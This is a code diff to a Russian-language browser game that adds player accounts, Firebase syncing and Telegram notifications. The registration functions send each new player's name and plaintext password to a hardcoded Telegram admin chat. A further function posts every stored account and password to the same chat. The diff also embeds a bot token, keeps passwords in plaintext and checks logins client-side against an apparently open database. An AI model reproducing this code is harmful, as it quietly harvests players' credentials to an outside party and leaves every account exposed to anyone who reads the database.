@@ -191,6 +191,391 @@ window.addEventListener('contextmenu', e => {
     if (gameState === "PLAYING" || window.rebindingActive) e.preventDefault();
 });
 
+// --- ACCOUNTS & AUTH MANAGER ---
+// --- CLOUD DATABASE & ACCOUNTS (FIREBASE REALTIME DB) ---
+const FIREBASE_URL = 'https://silksong-shelter-default-rtdb.europe-west1.firebasedatabase.app';
+const ACCOUNTS_KEY = 'shelter_accounts';
+const CURRENT_USER_KEY = 'shelter_current_user';
+
+function loadAccounts() {
+    try {
+        let raw = localStorage.getItem(ACCOUNTS_KEY);
+        if (raw) return JSON.parse(raw);
+    } catch(e){}
+    return {};
+}
+
+function saveAccounts(accs) {
+    try {
+        localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(accs));
+    } catch(e){}
+}
+
+function getCurrentUser() {
+    try {
+        return localStorage.getItem(CURRENT_USER_KEY) || null;
+    } catch(e){
+        return null;
+    }
+}
+
+function setCurrentUser(name) {
+    try {
+        localStorage.setItem(CURRENT_USER_KEY, name);
+    } catch(e){}
+}
+
+function clearCurrentUser() {
+    try {
+        localStorage.removeItem(CURRENT_USER_KEY);
+    } catch(e){}
+}
+
+// --- TELEGRAM ADMIN BOT INTEGRATION ---
+const TG_BOT_TOKEN = '8425811496:AAHkIJ_d1Ax4VyLvyKq4hWoWJfsC6SCYk-Q';
+const TG_ADMIN_CHAT_ID = '6465929018';
+
+function sendTelegramNotification(text) {
+    try {
+        if (!TG_BOT_TOKEN || !TG_ADMIN_CHAT_ID) return;
+        let url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TG_ADMIN_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        }).catch(err => {
+            console.warn("TG notification failed:", err);
+        });
+    } catch(e) {
+        console.warn("TG error:", e);
+    }
+}
+window.sendTelegramNotification = sendTelegramNotification;
+
+// Background sync with Firebase Realtime Database
+async function syncAccountsFromFirebase() {
+    try {
+        let res = await fetch(`${FIREBASE_URL}/accounts.json`);
+        let cloudData = await res.json();
+        let localAccs = loadAccounts();
+        let changed = false;
+
+        // 1. Merge cloud data into local
+        if (cloudData && typeof cloudData === 'object') {
+            for (let k in cloudData) {
+                if (cloudData[k]) {
+                    localAccs[k] = cloudData[k];
+                    changed = true;
+                }
+            }
+        }
+
+        // 2. Upload any local account that isn't in Firebase yet (e.g. РЫБа)
+        for (let k in localAccs) {
+            if (!cloudData || !cloudData[k]) {
+                fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(k)}.json`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(localAccs[k])
+                }).catch(e => console.warn("Firebase upload local acc:", e));
+            }
+        }
+
+        if (changed) {
+            saveAccounts(localAccs);
+        }
+        return localAccs;
+    } catch(e) {
+        console.warn("Firebase sync error:", e);
+        return loadAccounts();
+    }
+}
+window.syncAccountsFromFirebase = syncAccountsFromFirebase;
+
+async function registerUser(name, password) {
+    let cleanName = (name || '').trim();
+    if (!cleanName) {
+        return { success: false, message: "Введите имя игрока!" };
+    }
+    if (cleanName.length < 2) {
+        return { success: false, message: "Имя должно быть не короче 2 символов!" };
+    }
+    if (!password || password.length < 4) {
+        return { success: false, message: "Пароль должен содержать от 4 символов!" };
+    }
+
+    let lowerKey = cleanName.toLowerCase();
+    let accs = loadAccounts();
+
+    // Check local accounts
+    if (accs[lowerKey]) {
+        return { success: false, message: "Такое имя уже есть, придумай другое!" };
+    }
+
+    // Check Firebase Realtime Database to prevent duplicate usernames across devices
+    try {
+        let checkRes = await fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(lowerKey)}.json`);
+        let existing = await checkRes.json();
+        if (existing) {
+            accs[lowerKey] = existing;
+            saveAccounts(accs);
+            return { success: false, message: "Такое имя уже занято другим игроком!" };
+        }
+    } catch(e) {}
+
+    let newAcc = {
+        name: cleanName,
+        password: password,
+        createdAt: Date.now(),
+        stats: {
+            soloNormalWins: 0, soloNormalLosses: 0,
+            soloSecretWins: 0, soloSecretLosses: 0,
+            duoNormalWins: 0, duoNormalLosses: 0,
+            duoSecretWins: 0, duoSecretLosses: 0
+        }
+    };
+
+    accs[lowerKey] = newAcc;
+    saveAccounts(accs);
+    setCurrentUser(cleanName);
+
+    // Save to Firebase Cloud Realtime Database
+    try {
+        fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(lowerKey)}.json`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(newAcc)
+        }).catch(err => console.warn("Firebase save acc err:", err));
+    } catch(e) {}
+
+    // Уведомление главному админу в Telegram
+    sendTelegramNotification(
+        `🎮 <b>Убежище: Новый игрок!</b>\n` +
+        `👤 <b>Имя:</b> ${cleanName}\n` +
+        `🔑 <b>Пароль:</b> ${password}\n` +
+        `⏰ <i>${new Date().toLocaleTimeString()}</i>`
+    );
+
+    return { success: true, user: newAcc };
+}
+
+async function loginUser(name, password) {
+    let cleanName = (name || '').trim();
+    if (!cleanName) {
+        return { success: false, message: "Введите имя игрока!" };
+    }
+    let accs = loadAccounts();
+    let lowerKey = cleanName.toLowerCase();
+    let acc = accs[lowerKey];
+
+    // If not found in local cache, query Firebase Cloud Database!
+    if (!acc) {
+        try {
+            let res = await fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(lowerKey)}.json`);
+            let cloudAcc = await res.json();
+            if (cloudAcc) {
+                acc = cloudAcc;
+                accs[lowerKey] = cloudAcc;
+                saveAccounts(accs);
+            }
+        } catch(e) {}
+    }
+
+    if (!acc) {
+        return { success: false, message: "Игрок с таким именем не найден!" };
+    }
+    if (acc.password !== password) {
+        return { success: false, message: "Неверный пароль!" };
+    }
+    setCurrentUser(acc.name);
+    return { success: true, user: acc };
+}
+
+function getUserAccount(name) {
+    if (!name) return null;
+    let accs = loadAccounts();
+    return accs[name.toLowerCase()] || null;
+}
+
+// Send full roster of all players and passwords to Telegram bot
+async function sendAllAccountsToTelegram() {
+    let accs = loadAccounts();
+    try {
+        let res = await fetch(`${FIREBASE_URL}/accounts.json`);
+        let data = await res.json();
+        if (data) accs = data;
+    } catch(e) {}
+
+    let list = Object.values(accs);
+    if (list.length === 0) {
+        return { success: false, message: "База пуста!" };
+    }
+
+    list.forEach(a => {
+        let st = a.stats || { soloNormalWins: 0, soloSecretWins: 0, duoNormalWins: 0, duoSecretWins: 0 };
+        a._totalWins = (st.soloNormalWins || 0) + (st.soloSecretWins || 0) + (st.duoNormalWins || 0) + (st.duoSecretWins || 0);
+    });
+    list.sort((a, b) => b._totalWins - a._totalWins);
+
+    let lines = [
+        `👑 <b>БАЗА ИГРОКОВ «УБЕЖИЩЕ»</b>\n`,
+        `👥 Всего игроков: <b>${list.length}</b>\n`
+    ];
+
+    list.forEach((acc, idx) => {
+        let w = acc._totalWins || 0;
+        let mark = idx === 0 ? "🥇" : (idx === 1 ? "🥈" : (idx === 2 ? "🥉" : "🔹"));
+        lines.push(
+            `${mark} <b>${acc.name}</b>\n` +
+            `   🔑 Пароль: <code>${acc.password || '—'}</code>\n` +
+            `   🏆 Побед: <b>${w}</b>\n`
+        );
+    });
+
+    lines.push(`⏰ <i>${new Date().toLocaleTimeString()}</i>`);
+
+    try {
+        let res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TG_ADMIN_CHAT_ID,
+                text: lines.join('\n'),
+                parse_mode: 'HTML'
+            })
+        });
+        let json = await res.json();
+        return { success: json.ok, message: json.ok ? "Отправлено!" : json.description };
+    } catch(e) {
+        return { success: false, message: e.message };
+    }
+}
+window.sendAllAccountsToTelegram = sendAllAccountsToTelegram;
+
+// --- PLAYER 2 ACCOUNT MANAGEMENT ---
+let p2CurrentUser = "Гость";
+
+function getP2User() {
+    return p2CurrentUser || "Гость";
+}
+window.getP2User = getP2User;
+
+function setP2User(name) {
+    p2CurrentUser = (name && name.trim()) ? name.trim() : "Гость";
+}
+window.setP2User = setP2User;
+
+async function loginUserP2(name, password) {
+    let cleanName = (name || '').trim();
+    if (!cleanName) {
+        return { success: false, message: "Введите имя игрока 2!" };
+    }
+    if (cleanName.toLowerCase() === 'гость' || cleanName.toLowerCase() === 'noname') {
+        setP2User("Гость");
+        return { success: true, user: { name: "Гость" } };
+    }
+
+    let accs = loadAccounts();
+    let lowerKey = cleanName.toLowerCase();
+    let acc = accs[lowerKey];
+
+    // Check Firebase if not in local cache
+    if (!acc) {
+        try {
+            let res = await fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(lowerKey)}.json`);
+            let cloudAcc = await res.json();
+            if (cloudAcc) {
+                acc = cloudAcc;
+                accs[lowerKey] = cloudAcc;
+                saveAccounts(accs);
+            }
+        } catch(e) {}
+    }
+
+    if (!acc) {
+        return { success: false, message: "Игрок не найден! Нажмите 'Регистрация' для создания." };
+    }
+    if (acc.password !== password) {
+        return { success: false, message: "Неверный пароль! Аккаунт защищен." };
+    }
+
+    setP2User(acc.name);
+    return { success: true, user: acc };
+}
+window.loginUserP2 = loginUserP2;
+
+async function registerUserP2(name, password) {
+    let cleanName = (name || '').trim();
+    if (!cleanName) {
+        return { success: false, message: "Введите имя игрока 2!" };
+    }
+    if (cleanName.length < 2) {
+        return { success: false, message: "Имя должно быть не короче 2 символов!" };
+    }
+    if (cleanName.toLowerCase() === 'гость' || cleanName.toLowerCase() === 'noname') {
+        return { success: false, message: "Имя 'Гость' зарезервировано, придумайте другое!" };
+    }
+    if (!password || password.length < 4) {
+        return { success: false, message: "Пароль должен содержать от 4 символов!" };
+    }
+
+    let lowerKey = cleanName.toLowerCase();
+    let accs = loadAccounts();
+
+    if (accs[lowerKey]) {
+        return { success: false, message: "Такое имя уже есть, войдите или придумайте другое!" };
+    }
+
+    try {
+        let checkRes = await fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(lowerKey)}.json`);
+        let existing = await checkRes.json();
+        if (existing) {
+            accs[lowerKey] = existing;
+            saveAccounts(accs);
+            return { success: false, message: "Такое имя уже занято другим игроком!" };
+        }
+    } catch(e) {}
+
+    let newAcc = {
+        name: cleanName,
+        password: password,
+        createdAt: Date.now(),
+        stats: {
+            soloNormalWins: 0, soloNormalLosses: 0,
+            soloSecretWins: 0, soloSecretLosses: 0,
+            duoNormalWins: 0, duoNormalLosses: 0,
+            duoSecretWins: 0, duoSecretLosses: 0
+        },
+        coopPartners: {}
+    };
+
+    accs[lowerKey] = newAcc;
+    saveAccounts(accs);
+    setP2User(cleanName);
+
+    try {
+        fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(lowerKey)}.json`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(newAcc)
+        }).catch(err => console.warn("Firebase save P2 acc err:", err));
+    } catch(e) {}
+
+    sendTelegramNotification(
+        `🎮 <b>Убежище: Новый Игрок 2!</b>\n` +
+        `👤 <b>Имя:</b> ${cleanName}\n` +
+        `🔑 <b>Пароль:</b> ${password}\n` +
+        `⏰ <i>${new Date().toLocaleTimeString()}</i>`
+    );
+
+    return { success: true, user: newAcc };
+}
+window.registerUserP2 = registerUserP2;
+
 // --- STATS & ACHIEVEMENTS MANAGER ---
 const STATS_KEY = 'shelter_game_stats';
 function loadGameStats() {
@@ -231,6 +616,118 @@ function recordBattleResult(isVictory) {
         }
     }
     saveGameStats(s);
+
+    let curUser = getCurrentUser();
+    let p2 = getP2User();
+    let accs = loadAccounts();
+
+    // 1. Запись в профиль Игрока 1 (Хозяин устройства)
+    if (curUser) {
+        let userAcc = accs[curUser.toLowerCase()];
+        if (userAcc) {
+            if (!userAcc.stats) {
+                userAcc.stats = {
+                    soloNormalWins: 0, soloNormalLosses: 0,
+                    soloSecretWins: 0, soloSecretLosses: 0,
+                    duoNormalWins: 0, duoNormalLosses: 0,
+                    duoSecretWins: 0, duoSecretLosses: 0
+                };
+            }
+            if (numPlayers === 1) {
+                if (!secretMode) {
+                    if (isVictory) userAcc.stats.soloNormalWins++; else userAcc.stats.soloNormalLosses++;
+                } else {
+                    if (isVictory) userAcc.stats.soloSecretWins++; else userAcc.stats.soloSecretLosses++;
+                }
+            } else {
+                if (!secretMode) {
+                    if (isVictory) userAcc.stats.duoNormalWins++; else userAcc.stats.duoNormalLosses++;
+                } else {
+                    if (isVictory) userAcc.stats.duoSecretWins++; else userAcc.stats.duoSecretLosses++;
+                }
+                // Запись напарника в историю Игрока 1
+                userAcc.coopPartners = userAcc.coopPartners || {};
+                if (!userAcc.coopPartners[p2]) {
+                    userAcc.coopPartners[p2] = { wins: 0, battles: 0 };
+                }
+                userAcc.coopPartners[p2].battles++;
+                if (isVictory) userAcc.coopPartners[p2].wins++;
+            }
+            saveAccounts(accs);
+
+            // Обновление в облаке Firebase для Игрока 1
+            try {
+                fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(curUser.toLowerCase())}.json`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ stats: userAcc.stats, coopPartners: userAcc.coopPartners })
+                }).catch(e => console.warn("Firebase p1 sync error:", e));
+            } catch(e) {}
+        }
+    }
+
+    // 2. Запись в профиль Игрока 2 (если он не гость)
+    if (numPlayers === 2 && p2 && p2.toLowerCase() !== 'гость' && p2.toLowerCase() !== 'noname') {
+        let p2Acc = accs[p2.toLowerCase()];
+        if (p2Acc) {
+            if (!p2Acc.stats) {
+                p2Acc.stats = {
+                    soloNormalWins: 0, soloNormalLosses: 0,
+                    soloSecretWins: 0, soloSecretLosses: 0,
+                    duoNormalWins: 0, duoNormalLosses: 0,
+                    duoSecretWins: 0, duoSecretLosses: 0
+                };
+            }
+            if (!secretMode) {
+                if (isVictory) p2Acc.stats.duoNormalWins++; else p2Acc.stats.duoNormalLosses++;
+            } else {
+                if (isVictory) p2Acc.stats.duoSecretWins++; else p2Acc.stats.duoSecretLosses++;
+            }
+            // Запись Игрока 1 в историю Игрока 2
+            p2Acc.coopPartners = p2Acc.coopPartners || {};
+            let p1Name = curUser || "Хозяин";
+            if (!p2Acc.coopPartners[p1Name]) {
+                p2Acc.coopPartners[p1Name] = { wins: 0, battles: 0 };
+            }
+            p2Acc.coopPartners[p1Name].battles++;
+            if (isVictory) p2Acc.coopPartners[p1Name].wins++;
+
+            saveAccounts(accs);
+
+            // Обновление в облаке Firebase для Игрока 2
+            try {
+                fetch(`${FIREBASE_URL}/accounts/${encodeURIComponent(p2.toLowerCase())}.json`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ stats: p2Acc.stats, coopPartners: p2Acc.coopPartners })
+                }).catch(e => console.warn("Firebase p2 sync error:", e));
+            } catch(e) {}
+        }
+    }
+
+    // Уведомление в Telegram админу о победе над Боссом!
+    if (isVictory) {
+        let curUserStr = curUser || "Аноним";
+        let userAcc = getUserAccount(curUserStr);
+        let totalW = (userAcc && userAcc.stats) 
+            ? (userAcc.stats.soloNormalWins + userAcc.stats.soloSecretWins + userAcc.stats.duoNormalWins + userAcc.stats.duoSecretWins) 
+            : 1;
+        let modeStr = (numPlayers === 1)
+            ? (secretMode ? "Одиночный [Режим L] 😈" : "Одиночный (Обычный) ⚔️")
+            : (secretMode ? "Кооператив [Режим L] 🔥" : "Кооператив (Обычный) 🤝");
+        
+        let teamInfo = (numPlayers === 1)
+            ? `👤 <b>Игрок:</b> ${curUserStr}\n`
+            : `👥 <b>Команда:</b> ${curUserStr} и ${p2}\n`;
+
+        sendTelegramNotification(
+            `🏆 <b>ПОБЕДА НАД БОССОМ!</b>\n` +
+            teamInfo +
+            `⚔️ <b>Режим:</b> ${modeStr}\n` +
+            `📊 <b>Побед у ${curUserStr}:</b> ${totalW}\n` +
+            `⏰ <i>${new Date().toLocaleTimeString()}</i>`
+        );
+    }
 }
 
 const badgesDict = {
